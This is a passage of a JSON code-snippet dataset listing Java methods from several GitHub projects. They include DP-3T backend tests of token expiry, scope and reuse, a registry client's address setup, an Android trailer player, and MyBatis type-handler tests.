OffsetDateTime.now().withOffsetSameInstant(ZoneOffset.UTC).plusMinutes(5));\n\t\tMockHttpServletResponse response = mockMvc.perform(\n\t\t\t\tpost(\"/v1/exposed\").contentType(MediaType.APPLICATION_JSON).header(\"Authorization\", \"Bearer \" + token)\n\t\t\t\t\t\t.header(\"User-Agent\", \"MockMVC\").content(json(exposeeRequest)))\n\t\t\t\t.andExpect(status().is2xxSuccessful()).andReturn().getResponse();\n\t\tresponse = mockMvc\n\t\t\t\t.perform(post(\"/v1/exposed\").contentType(MediaType.APPLICATION_JSON)\n\t\t\t\t\t\t.header(\"Authorization\", \"Bearer \" + jwtToken).header(\"User-Agent\", \"MockMVC\")\n\t\t\t\t\t\t.content(json(exposeeRequest)))\n\t\t\t\t.andExpect(status().is(401)).andExpect(content().string(\"\")).andReturn().getResponse();\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-backend/develop/dpppt-backend-sdk/dpppt-backend-sdk-ws/src/test/java/org/dpppt/backend/sdk/ws/controller/DPPPTControllerTest.java", "stars": "125", "class_props": {"extends": "BaseControllerTest", "implements": null, "modifiers": ["public"]}}, {"id": 58348, "method_name": "cannotUseKeyDateBeforeOnset", "class_name": "DPPPTControllerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void cannotUseKeyDateBeforeOnset() throws Exception {\n\t\tExposeeRequest exposeeRequest = new ExposeeRequest();\n\t\texposeeRequest.setAuthData(new ExposeeAuthData());\n\t\texposeeRequest.setKeyDate(\n\t\t\t\tLocalDate.now().minusDays(2).atStartOfDay().atOffset(ZoneOffset.UTC).toInstant().toEpochMilli());\n\t\texposeeRequest.setKey(Base64.getEncoder().encodeToString(\"testKey32Bytes--testKey32Bytes--\".getBytes(\"UTF-8\")));\n\t\texposeeRequest.setIsFake(1);\n\t\tString token = createToken(OffsetDateTime.now().withOffsetSameInstant(ZoneOffset.UTC).plusMinutes(5),\n\t\t\t\tLocalDate.now().format(DateTimeFormatter.ISO_DATE));\n\t\tMockHttpServletResponse response = mockMvc.perform(\n\t\t\t\tpost(\"/v1/exposed\").contentType(MediaType.APPLICATION_JSON).header(\"Authorization\", \"Bearer \" + token)\n\t\t\t\t\t\t.header(\"User-Agent\", \"MockMVC\").content(json(exposeeRequest)))\n\t\t\t\t.andExpect(status().is(400)).andReturn().getResponse();\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-backend/develop/dpppt-backend-sdk/dpppt-backend-sdk-ws/src/test/java/org/dpppt/backend/sdk/ws/controller/DPPPTControllerTest.java", "stars": "125", "class_props": {"extends": "BaseControllerTest", "implements": null, "modifiers": ["public"]}}, {"id": 58349, "method_name": "cannotUseSameTokenTwice", "class_name": "DPPPTControllerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void cannotUseSameTokenTwice() throws Exception {\n\t\tExposeeRequest exposeeRequest = new ExposeeRequest();\n\t\texposeeRequest.setAuthData(new ExposeeAuthData());\n\t\texposeeRequest\n\t\t\t\t.setKeyDate(OffsetDateTime.now().withOffsetSameInstant(ZoneOffset.UTC).toInstant().toEpochMilli());\n\t\texposeeRequest.setKey(Base64.getEncoder().encodeToString(\"testKey32Bytes--testKey32Bytes--\".getBytes(\"UTF-8\")));\n\t\texposeeRequest.setIsFake(0);\n\t\tString token = createToken(OffsetDateTime.now().withOffsetSameInstant(ZoneOffset.UTC).plusMinutes(5));\n\n\t\tMockHttpServletResponse response = mockMvc.perform(\n\t\t\t\tpost(\"/v1/exposed\").contentType(MediaType.APPLICATION_JSON).header(\"Authorization\", \"Bearer \" + token)\n\t\t\t\t\t\t.header(\"User-Agent\", \"MockMVC\").content(json(exposeeRequest)))\n\t\t\t\t.andExpect(status().is2xxSuccessful()).andReturn().getResponse();\n\n\t\tresponse = mockMvc\n\t\t\t\t.perform(post(\"/v1/exposed\").contentType(MediaType.APPLICATION_JSON)\n\t\t\t\t\t\t.header(\"Authorization\", \"Bearer \" + token).header(\"User-Agent\", \"MockMVC\")\n\t\t\t\t\t\t.content(json(exposeeRequest)))\n\t\t\t\t.andExpect(status().is(401)).andExpect(content().string(\"\")).andReturn().getResponse();\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-backend/develop/dpppt-backend-sdk/dpppt-backend-sdk-ws/src/test/java/org/dpppt/backend/sdk/ws/controller/DPPPTControllerTest.java", "stars": "125", "class_props": {"extends": "BaseControllerTest", "implements": null, "modifiers": ["public"]}}, {"id": 58350, "method_name": "canUseSameTokenTwiceIfFake", "class_name": "DPPPTControllerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void canUseSameTokenTwiceIfFake() throws Exception {\n\t\tExposeeRequest exposeeRequest = new ExposeeRequest();\n\t\texposeeRequest.setAuthData(new ExposeeAuthData());\n\t\texposeeRequest\n\t\t\t\t.setKeyDate(OffsetDateTime.now().withOffsetSameInstant(ZoneOffset.UTC).toInstant().toEpochMilli());\n\t\texposeeRequest.setKey(Base64.getEncoder().encodeToString(\"testKey32Bytes--testKey32Bytes--\".getBytes(\"UTF-8\")));\n\t\texposeeRequest.setIsFake(1);\n\t\tString token = createToken(true, OffsetDateTime.now().withOffsetSameInstant(ZoneOffset.UTC).plusMinutes(5));\n\n\t\tMockHttpServletResponse response = mockMvc.perform(\n\t\t\t\tpost(\"/v1/exposed\").contentType(MediaType.APPLICATION_JSON).header(\"Authorization\", \"Bearer \" + token)\n\t\t\t\t\t\t.header(\"User-Agent\", \"MockMVC\").content(json(exposeeRequest)))\n\t\t\t\t.andExpect(status().is2xxSuccessful()).andReturn().getResponse();\n\n\t\tresponse = mockMvc.perform(\n\t\t\t\tpost(\"/v1/exposed\").contentType(MediaType.APPLICATION_JSON).header(\"Authorization\", \"Bearer \" + token)\n\t\t\t\t\t\t.header(\"User-Agent\", \"MockMVC\").content(json(exposeeRequest)))\n\t\t\t\t.andExpect(status().is2xxSuccessful()).andReturn().getResponse();\n\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-backend/develop/dpppt-backend-sdk/dpppt-backend-sdk-ws/src/test/java/org/dpppt/backend/sdk/ws/controller/DPPPTControllerTest.java", "stars": "125", "class_props": {"extends": "BaseControllerTest", "implements": null, "modifiers": ["public"]}}, {"id": 58351, "method_name": "cannotUseExpiredToken", "class_name": "DPPPTControllerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void cannotUseExpiredToken() throws Exception {\n\t\tExposeeRequest exposeeRequest = new ExposeeRequest();\n\t\texposeeRequest.setAuthData(new ExposeeAuthData());\n\t\texposeeRequest\n\t\t\t\t.setKeyDate(OffsetDateTime.now().withOffsetSameInstant(ZoneOffset.UTC).toInstant().toEpochMilli());\n\t\texposeeRequest.setKey(Base64.getEncoder().encodeToString(\"testKey32Bytes--testKey32Bytes--\".getBytes(\"UTF-8\")));\n\t\texposeeRequest.setIsFake(0);\n\t\tString token = createToken(OffsetDateTime.now().withOffsetSameInstant(ZoneOffset.UTC).minusMinutes(5));\n\n\t\tMockHttpServletResponse response = mockMvc\n\t\t\t\t.perform(post(\"/v1/exposed\").contentType(MediaType.APPLICATION_JSON)\n\t\t\t\t\t\t.header(\"Authorization\", \"Bearer \" + token).header(\"User-Agent\", \"MockMVC\")\n\t\t\t\t\t\t.content(json(exposeeRequest)))\n\t\t\t\t.andExpect(status().is4xxClientError()).andReturn().getResponse();\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-backend/develop/dpppt-backend-sdk/dpppt-backend-sdk-ws/src/test/java/org/dpppt/backend/sdk/ws/controller/DPPPTControllerTest.java", "stars": "125", "class_props": {"extends": "BaseControllerTest", "implements": null, "modifiers": ["public"]}}, {"id": 58352, "method_name": "cannotUseKeyDateInFuture", "class_name": "DPPPTControllerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void cannotUseKeyDateInFuture() throws Exception {\n\t\tExposeeRequest exposeeRequest = new ExposeeRequest();\n\t\texposeeRequest.setAuthData(new ExposeeAuthData());\n\t\texposeeRequest.setKeyDate(\n\t\t\t\tOffsetDateTime.now().plusDays(2).withOffsetSameInstant(ZoneOffset.UTC).toInstant().toEpochMilli());\n\t\texposeeRequest.setKey(Base64.getEncoder().encodeToString(\"testKey32Bytes--testKey32Bytes--\".getBytes(\"UTF-8\")));\n\n\t\texposeeRequest.setIsFake(0);\n\t\tString token = createToken(OffsetDateTime.now().withOffsetSameInstant(ZoneOffset.UTC).plusMinutes(5));\n\n\t\tMockHttpServletResponse response = mockMvc\n\t\t\t\t.perform(post(\"/v1/exposed\").contentType(MediaType.APPLICATION_JSON)\n\t\t\t\t\t\t.header(\"Authorization\", \"Bearer \" + token).header(\"User-Agent\", \"MockMVC\")\n\t\t\t\t\t\t.content(json(exposeeRequest)))\n\t\t\t\t.andExpect(status().is4xxClientError()).andReturn().getResponse();\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-backend/develop/dpppt-backend-sdk/dpppt-backend-sdk-ws/src/test/java/org/dpppt/backend/sdk/ws/controller/DPPPTControllerTest.java", "stars": "125", "class_props": {"extends": "BaseControllerTest", "implements": null, "modifiers": ["public"]}}, {"id": 58353, "method_name": "keyDateNotOlderThan21Days", "class_name": "DPPPTControllerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void keyDateNotOlderThan21Days() throws Exception {\n\t\tExposeeRequest exposeeRequest = new ExposeeRequest();\n\t\texposeeRequest.setAuthData(new ExposeeAuthData());\n\t\texposeeRequest.setKeyDate(\n\t\t\t\tOffsetDateTime.now().withOffsetSameInstant(ZoneOffset.UTC).minusDays(22).toInstant().toEpochMilli());\n\n\t\texposeeRequest.setKey(Base64.getEncoder().encodeToString(\"testKey32Bytes--testKey32Bytes--\".getBytes(\"UTF-8\")));\n\t\texposeeRequest.setIsFake(0);\n\t\tString token = createToken(OffsetDateTime.now().withOffsetSameInstant(ZoneOffset.UTC).plusMinutes(5),\n\t\t\t\t\"2020-01-01\");\n\n\t\tMockHttpServletResponse response = mockMvc\n\t\t\t\t.perform(post(\"/v1/exposed\").contentType(MediaType.APPLICATION_JSON)\n\t\t\t\t\t\t.header(\"Authorization\", \"Bearer \" + token).header(\"User-Agent\", \"MockMVC\")\n\t\t\t\t\t\t.content(json(exposeeRequest)))\n\t\t\t\t.andExpect(status().is4xxClientError()).andReturn().getResponse();\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-backend/develop/dpppt-backend-sdk/dpppt-backend-sdk-ws/src/test/java/org/dpppt/backend/sdk/ws/controller/DPPPTControllerTest.java", "stars": "125", "class_props": {"extends": "BaseControllerTest", "implements": null, "modifiers": ["public"]}}, {"id": 58354, "method_name": "cannotUseTokenWithWrongScope", "class_name": "DPPPTControllerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void cannotUseTokenWithWrongScope() throws Exception {\n\t\tExposeeRequest exposeeRequest = new ExposeeRequest();\n\t\texposeeRequest.setAuthData(new ExposeeAuthData());\n\t\texposeeRequest\n\t\t\t\t.setKeyDate(OffsetDateTime.now().withOffsetSameInstant(ZoneOffset.UTC).toInstant().toEpochMilli());\n\t\texposeeRequest.setKey(Base64.getEncoder().encodeToString(\"testKey32Bytes--testKey32Bytes--\".getBytes(\"UTF-8\")));\n\t\texposeeRequest.setIsFake(0);\n\t\tString token = createTokenWithScope(OffsetDateTime.now().withOffsetSameInstant(ZoneOffset.UTC).plusMinutes(5),\n\t\t\t\t\"not-exposed\");\n\n\t\tMockHttpServletResponse response = mockMvc\n\t\t\t\t.perform(post(\"/v1/exposed\").contentType(MediaType.APPLICATION_JSON)\n\t\t\t\t\t\t.header(\"Authorization\", \"Bearer \" + token).header(\"User-Agent\", \"MockMVC\")\n\t\t\t\t\t\t.content(json(exposeeRequest)))\n\t\t\t\t.andExpect(status().is(403)).andExpect(content().string(\"\")).andReturn().getResponse();\n\n\t\t// Also for a 403 response, the token cannot be used a 2nd time\n\t\tresponse = mockMvc\n\t\t\t\t.perform(post(\"/v1/exposed\").contentType(MediaType.APPLICATION_JSON)\n\t\t\t\t\t\t.header(\"Authorization\", \"Bearer \" + token).header(\"User-Agent\", \"MockMVC\")\n\t\t\t\t\t\t.content(json(exposeeRequest)))\n\t\t\t\t.andExpect(status().is(401)).andExpect(content().string(\"\")).andReturn().getResponse();\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-backend/develop/dpppt-backend-sdk/dpppt-backend-sdk-ws/src/test/java/org/dpppt/backend/sdk/ws/controller/DPPPTControllerTest.java", "stars": "125", "class_props": {"extends": "BaseControllerTest", "implements": null, "modifiers": ["public"]}}, {"id": 58355, "method_name": "cannotUsedLongLivedToken", "class_name": "DPPPTControllerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void cannotUsedLongLivedToken() throws Exception {\n\t\tExposeeRequest exposeeRequest = new ExposeeRequest();\n\t\texposeeRequest.setAuthData(new ExposeeAuthData());\n\t\texposeeRequest\n\t\t\t\t.setKeyDate(OffsetDateTime.now().withOffsetSameInstant(ZoneOffset.UTC).toInstant().toEpochMilli());\n\t\texposeeRequest.setKey(Base64.getEncoder().encodeToString(\"testKey32Bytes--testKey32Bytes--\".getBytes(\"UTF-8\")));\n\t\texposeeRequest.setIsFake(0);\n\t\tString token = createToken(OffsetDateTime.now(ZoneOffset.UTC).plusDays(90)); // very late expiration date\n\t\tMockHttpServletResponse response = mockMvc\n\t\t\t\t.perform(post(\"/v1/exposed\").contentType(MediaType.APPLICATION_JSON)\n\t\t\t\t\t\t.header(\"Authorization\", \"Bearer \" + token).header(\"User-Agent\", \"MockMVC\")\n\t\t\t\t\t\t.content(json(exposeeRequest)))\n\t\t\t\t.andExpect(status().is(401)).andExpect(content().string(\"\")).andReturn().getResponse();\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-backend/develop/dpppt-backend-sdk/dpppt-backend-sdk-ws/src/test/java/org/dpppt/backend/sdk/ws/controller/DPPPTControllerTest.java", "stars": "125", "class_props": {"extends": "BaseControllerTest", "implements": null, "modifiers": ["public"]}}, {"id": 58356, "method_name": "init", "class_name": "DiscoveryProperties", "params": [], "throws": ["UnknownHostException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void init() throws UnknownHostException {\n        if(namespace==null){\n            namespace= Constants.DEFAULT_NAMESPACE;\n        }\n        if(clusterName==null){\n            clusterName= Constants.DEFAULT_GROUP;\n        }\n\n        //\u8bc1\u660e\u6709\u96c6\u7fa4\n        if(serverAddr.contains(\",\")&&nettyServerAddr.contains(\",\")){\n            String[] servers = serverAddr.split(\",\");\n            String[] nettyServers=nettyServerAddr.split(\",\");\n            for(int i=0;i<servers.length;i++){\n                if(servers[i].startsWith(\"localhost\")){\n                    //localhost\u6362\u6210192.168.153.1\u8fd9\u79cd\n                    servers[i]=InetAddress.getLocalHost().getHostAddress().toString()+\":\"+servers[i].split(\":\")[1];\n                }\n                if(nettyServers[i].startsWith(\"localhost\")){\n                    nettyServers[i]=InetAddress.getLocalHost().getHostAddress().toString()+\":\"+nettyServers[i].split(\":\")[1];\n                }\n                mappingMap.put(servers[i],nettyServers[i]);\n            }\n        }else{\n            //\u53ea\u5199\u4e86\u4e00\u53f0server\u7684ip\n            if(serverAddr.startsWith(\"localhost\")){\n                serverAddr=InetAddress.getLocalHost().getHostAddress().toString()+\":\"+serverAddr.split(\":\")[1];\n            }\n            if(nettyServerAddr.startsWith(\"localhost\")){\n                nettyServerAddr=InetAddress.getLocalHost().getHostAddress().toString()+\":\"+nettyServerAddr.split(\":\")[1];\n            }\n            mappingMap.put(serverAddr,nettyServerAddr);\n        }\n\n        //\u672c\u673a\u7684ip\n        clientIp= InetAddress.getLocalHost().getHostAddress().toString();\n\n    }", "url": "https://raw.githubusercontent.com/lzj-github/registry/master/client/src/main/java/cn/lzj/nacos/client/config/DiscoveryProperties.java", "stars": "34", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58357, "method_name": "startActivity", "class_name": "TrailerPlayerActivity", "params": ["Activity", "String", "Media"], "throws": null, "modifiers": ["public", "static"], "return_type": "Intent", "snippet": "    public static Intent startActivity(Activity activity, String youTubeUrl, Media data) {\n        Intent i = new Intent(activity, TrailerPlayerActivity.class);\n        i.putExtra(DATA, data);\n        i.putExtra(LOCATION, youTubeUrl);\n        activity.startActivity(i);\n        return i;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/activities/TrailerPlayerActivity.java", "stars": "4", "class_props": {"extends": "ButterBaseActivity", "implements": ["VideoPlayerFragment"], "modifiers": ["public"]}}, {"id": 58358, "method_name": "onCreate", "class_name": "TrailerPlayerActivity", "params": ["Bundle"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onCreate(Bundle savedInstanceState) {\n\n        MobileButterApplication.getAppContext()\n                .getComponent()\n                .inject(this);\n        super.onCreate(savedInstanceState, R.layout.activity_videoplayer);\n\n        mMedia = getIntent().getParcelableExtra(DATA);\n        mMedia.title += \" \" + getString(R.string.trailer);\n        String youTubeUrl = getIntent().getStringExtra(LOCATION);\n\n        mStreamInfo = new StreamInfo(mMedia, null, null, null, null, null);\n\n        mVideoPlayerFragment = (VideoPlayerFragment) getSupportFragmentManager().findFragmentById(R.id.video_fragment);\n        mVideoPlayerFragment.enableSubsButton(false);\n\n        QueryYouTubeTask youTubeTask = new QueryYouTubeTask(youTubeManager);\n        youTubeTask.execute(youTubeManager.getYouTubeVideoId(youTubeUrl));\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/activities/TrailerPlayerActivity.java", "stars": "4", "class_props": {"extends": "ButterBaseActivity", "implements": ["VideoPlayerFragment"], "modifiers": ["public"]}}, {"id": 58359, "method_name": "onOptionsItemSelected", "class_name": "TrailerPlayerActivity", "params": ["MenuItem"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean onOptionsItemSelected(MenuItem item) {\n        switch (item.getItemId()) {\n            case android.R.id.home:\n                finish();\n                return true;\n        }\n        return super.onOptionsItemSelected(item);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/activities/TrailerPlayerActivity.java", "stars": "4", "class_props": {"extends": "ButterBaseActivity", "implements": ["VideoPlayerFragment"], "modifiers": ["public"]}}, {"id": 58360, "method_name": "getResumePosition", "class_name": "TrailerPlayerActivity", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Long", "snippet": "    public Long getResumePosition() {\n        return 0L;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/activities/TrailerPlayerActivity.java", "stars": "4", "class_props": {"extends": "ButterBaseActivity", "implements": ["VideoPlayerFragment"], "modifiers": ["public"]}}, {"id": 58361, "method_name": "getInfo", "class_name": "TrailerPlayerActivity", "params": [], "throws": null, "modifiers": ["public"], "return_type": "StreamInfo", "snippet": "    public StreamInfo getInfo() {\n        return mStreamInfo;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/activities/TrailerPlayerActivity.java", "stars": "4", "class_props": {"extends": "ButterBaseActivity", "implements": ["VideoPlayerFragment"], "modifiers": ["public"]}}, {"id": 58362, "method_name": "getService", "class_name": "TrailerPlayerActivity", "params": [], "throws": null, "modifiers": ["public"], "return_type": "TorrentService", "snippet": "    public TorrentService getService() {\n        return null;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/activities/TrailerPlayerActivity.java", "stars": "4", "class_props": {"extends": "ButterBaseActivity", "implements": ["VideoPlayerFragment"], "modifiers": ["public"]}}, {"id": 58363, "method_name": "doInBackground", "class_name": "QueryYouTubeTask", "params": ["String"], "throws": null, "modifiers": ["protected"], "return_type": "Uri", "snippet": "        protected Uri doInBackground(String... params) {\n            String uriStr = null;\n            String videoId = params[0];\n\n            if (isCancelled())\n                return null;\n\n            try {\n                if (isCancelled())\n                    return null;\n\n                ////////////////////////////////////\n                // calculate the actual URL of the video, encoded with proper YouTube token\n                uriStr = youTubeManager.calculateYouTubeUrl(\"22\", true, videoId);\n\n                if (isCancelled())\n                    return null;\n\n            } catch (Exception e) {\n                Log.e(this.getClass().getSimpleName(), \"Error occurred while retrieving information from YouTube.\", e);\n            }\n\n            if (uriStr != null) {\n                return Uri.parse(uriStr);\n            } else {\n                return null;\n            }\n        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/activities/TrailerPlayerActivity.java", "stars": "4", "class_props": {"extends": "AsyncTask", "implements": null, "modifiers": ["private"]}}, {"id": 58364, "method_name": "onPostExecute", "class_name": "QueryYouTubeTask", "params": ["Uri"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "        protected void onPostExecute(Uri result) {\n            super.onPostExecute(result);\n\n            try {\n                if (isCancelled())\n                    return;\n\n                if (result == null) {\n                    throw new RuntimeException(\"Invalid NULL Url.\");\n                }\n\n                mStreamInfo.setVideoLocation(URLDecoder.decode(result.toString()));\n\n                mVideoPlayerFragment.onMediaReady();\n            } catch (Exception e) {\n                Log.e(this.getClass().getSimpleName(), \"Error playing video!\", e);\n\n                if (!mShowedError) {\n                    showErrorAlert();\n                }\n            }\n        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/activities/TrailerPlayerActivity.java", "stars": "4", "class_props": {"extends": "AsyncTask", "implements": null, "modifiers": ["private"]}}, {"id": 58365, "method_name": "showErrorAlert", "class_name": "QueryYouTubeTask", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "        private void showErrorAlert() {\n            try {\n                AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(TrailerPlayerActivity.this);\n                alertDialogBuilder.setTitle(R.string.comm_error);\n                alertDialogBuilder.setCancelable(false);\n                alertDialogBuilder.setMessage(R.string.comm_message);\n\n                alertDialogBuilder.setPositiveButton(R.string.ok, new DialogInterface.OnClickListener() {\n                    @Override\n                    public void onClick(DialogInterface dialog, int which) {\n                        TrailerPlayerActivity.this.finish();\n                    }\n                });\n\n                AlertDialog lDialog = alertDialogBuilder.create();\n                lDialog.show();\n            } catch (Exception e) {\n                Log.e(this.getClass().getSimpleName(), \"Problem showing error dialog.\", e);\n            }\n        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/activities/TrailerPlayerActivity.java", "stars": "4", "class_props": {"extends": "AsyncTask", "implements": null, "modifiers": ["private"]}}, {"id": 58366, "method_name": "onProgressUpdate", "class_name": "QueryYouTubeTask", "params": ["Void"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "        protected void onProgressUpdate(Void... pValues) {\n            super.onProgressUpdate(pValues);\n        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/activities/TrailerPlayerActivity.java", "stars": "4", "class_props": {"extends": "AsyncTask", "implements": null, "modifiers": ["private"]}}, {"id": 58367, "method_name": "fromObject", "class_name": "FlowProps", "params": ["Object"], "throws": null, "modifiers": ["public", "static"], "return_type": "FlowProps", "snippet": "  public static FlowProps fromObject(final Object obj) {\n    final Map<String, Object> flowMap = (Map<String, Object>) obj;\n    final String source = (String) flowMap.get(\"source\");\n    final String parentSource = (String) flowMap.get(\"inherits\");\n\n    final FlowProps flowProps = new FlowProps(parentSource, source);\n    return flowProps;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/flow/FlowProps.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58368, "method_name": "getProps", "class_name": "FlowProps", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Props", "snippet": "  public Props getProps() {\n    return this.props;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/flow/FlowProps.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58369, "method_name": "setProps", "class_name": "FlowProps", "params": ["Props"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setProps(final Props props) {\n    this.props = props;\n    this.parentSource =\n        props.getParent() == null ? null : props.getParent().getSource();\n    this.propSource = props.getSource();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/flow/FlowProps.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58370, "method_name": "getSource", "class_name": "FlowProps", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getSource() {\n    return this.propSource;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/flow/FlowProps.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58371, "method_name": "getInheritedSource", "class_name": "FlowProps", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getInheritedSource() {\n    return this.parentSource;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/flow/FlowProps.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58372, "method_name": "toObject", "class_name": "FlowProps", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Object", "snippet": "  public Object toObject() {\n    final HashMap<String, Object> obj = new HashMap<>();\n    obj.put(\"source\", this.propSource);\n    if (this.parentSource != null) {\n      obj.put(\"inherits\", this.parentSource);\n    }\n    return obj;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/flow/FlowProps.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58373, "method_name": "getRegexp", "class_name": "JumpRegexp", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getRegexp() {\n        return regexp;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/model/JumpRegexp.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58374, "method_name": "setRegexp", "class_name": "JumpRegexp", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setRegexp(String regexp) {\n        this.regexp = regexp;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/model/JumpRegexp.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58375, "method_name": "isMoveLastChar", "class_name": "JumpRegexp", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isMoveLastChar() {\n        return moveLastChar;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/model/JumpRegexp.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58376, "method_name": "setMoveLastChar", "class_name": "JumpRegexp", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setMoveLastChar(boolean moveLastChar) {\n        this.moveLastChar = moveLastChar;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/model/JumpRegexp.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58377, "method_name": "shouldSetParameter", "class_name": "LocalTimeTypeHandlerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldSetParameter() throws Exception {\n    TYPE_HANDLER.setParameter(ps, 1, LOCAL_TIME, null);\n    verify(ps).setObject(1, LOCAL_TIME);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/LocalTimeTypeHandlerTest.java", "stars": "15", "class_props": {"extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"id": 58378, "method_name": "shouldGetResultFromResultSetByName", "class_name": "LocalTimeTypeHandlerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldGetResultFromResultSetByName() throws Exception {\n    when(rs.getObject(\"column\", LocalTime.class)).thenReturn(LOCAL_TIME);\n    assertEquals(LOCAL_TIME, TYPE_HANDLER.getResult(rs, \"column\"));\n    verify(rs, never()).wasNull();\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/LocalTimeTypeHandlerTest.java", "stars": "15", "class_props": {"extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"id": 58379, "method_name": "shouldGetResultNullFromResultSetByName", "class_name": "LocalTimeTypeHandlerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldGetResultNullFromResultSetByName() throws Exception {\n    when(rs.getObject(\"column\", LocalTime.class)).thenReturn(null);\n    assertNull(TYPE_HANDLER.getResult(rs, \"column\"));\n    verify(rs, never()).wasNull();\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/LocalTimeTypeHandlerTest.java", "stars": "15", "class_props": {"extends": 